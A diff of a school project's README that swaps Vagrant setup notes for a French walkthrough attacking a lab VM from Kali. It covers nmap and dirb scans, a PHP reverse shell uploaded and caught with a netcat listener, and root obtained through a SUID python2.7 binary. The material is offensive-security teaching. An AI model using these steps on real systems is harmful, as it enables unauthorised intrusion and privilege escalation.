@@ -1,17 +1,37 @@
-# HackableBox
-Just a school project 
+# Attaque depuis kali:
 
-## Installation
+## Reconnaissance
 
-#Vagrant 
+> nmap 192.168.60.0/24
 
-Install vagrant: https://www.vagrantup.com/downloads
+Visite du site web, on trouve que le serveur utilise php
 
-# Creating/destroying VM's 
+> dirb http://192.168.60.10/
 
-'vagrant up'
+> dirb http://192.168.60.10/ -X .php
 
-'vagrant destroy'
+## Reverse shell
 
-#Default kali login: 'vagrant/vagrant'
+Upload de shell.php dans /upload.php
 
+Attente du reverse shell depuis kali:
+
+> nc -nlvp 9001
+
+Ouvrir shell.php dans /uploads
+
+## Escalade de privilèges
+
+Trouver les fichiers avec SUID d'activé:
+
+> find / -perm -u=s -type f 2>/dev/null
+
+Utiliser python pour l'escalade:
+
+> cd /usr/bin
+
+> ./python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+Vérifier qu'on est root:
+
+> whoami
